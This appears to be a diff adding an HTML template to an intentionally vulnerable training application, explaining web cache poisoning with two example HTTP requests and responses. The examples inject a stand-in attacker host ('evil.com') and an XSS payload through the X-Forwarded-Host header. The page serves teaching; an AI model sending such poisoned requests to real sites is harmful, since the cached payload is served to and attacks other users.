@@ -1,0 +1,92 @@
+{% extends 'vuln10.html' %}
+
+{% block body %}
+    <style>
+        .content-container {
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 20px;
+            overflow-y: auto;
+            max-height: 600px; /* Adjust as needed */
+        }
+
+        /* Additional styles for the Web Cache Poisoning section */
+        .content-container h2 {
+            margin-top: 20px;
+        }
+
+        .content-container h3 {
+            margin-top: 10px;
+        }
+
+        .content-container h4 {
+            margin-top: 10px;
+        }
+
+        .content-container p {
+            margin-bottom: 10px;
+        }
+
+        .content-container pre {
+            background-color: #f8f8f8;
+            padding: 10px;
+            border-radius: 5px;
+            margin-bottom: 10px;
+        }
+
+        .content-container pre code {
+            font-family: Consolas, monospace;
+        }
+        .container {
+    width: 90%;
+    margin: auto;
+    padding: 20px;
+    background-color: #fff;
+    box-shadow: 0 0 20px rgba(0, 0, 0, 0.1);
+    border-radius: 10px;
+    margin-top: 30px;
+  }
+  .scrollable-content {
+    height: 450px; /* Adjust the height as needed */
+    overflow-y: auto;
+    padding-right: 20px;
+  }
+    </style>
+
+    <div class="container">
+        <h1>Web Cache Poisoning</h1>
+        <div class="scrollable-content">
+
+            <h2>Introduction</h2>
+            <p>The objective of web cache poisoning is to send a request that causes a harmful response that gets saved in the cache and served to other users.</p>
+            
+            <h2>How to exploit</h2>
+            
+            <h3>Basic poisoning</h3>
+            <pre><code>GET / HTTP/1.1
+                Host: www.vuln.com
+                X-Forwarded-Host: evil.com</code></pre>
+                <p>The response is:</p>
+                <pre><code>HTTP/1.1 200 OK
+                    Cache-Control: public, no-cache
+                    …
+                    &lt;img href="https://evil.com/a.png" /&gt;</code></pre>
+                    
+                    <!-- Additional exploitation technique -->
+                    <h3>Selective poisoning</h3>
+                    <pre><code>GET / HTTP/1.1
+                        Host: redacted.com
+                        User-Agent: Mozilla/5.0 (<snip> Firefox/60.0)
+                            X-Forwarded-Host: a"&gt;&lt;iframe onload=alert(1)&gt;
+                        </code></pre>
+                        <p>The response is:</p>
+                        <pre><code>HTTP/1.1 200 OK
+                            X-Served-By: cache-lhr6335-LHR
+                            Vary: User-Agent, Accept-Encoding
+                            …
+                            &lt;link rel="canonical" href="https://a"&gt;a&lt;iframe onload=alert(1)&gt;
+                        </code></pre>
+                        
+                    </div>
+                    </div>
+                    {% endblock %}
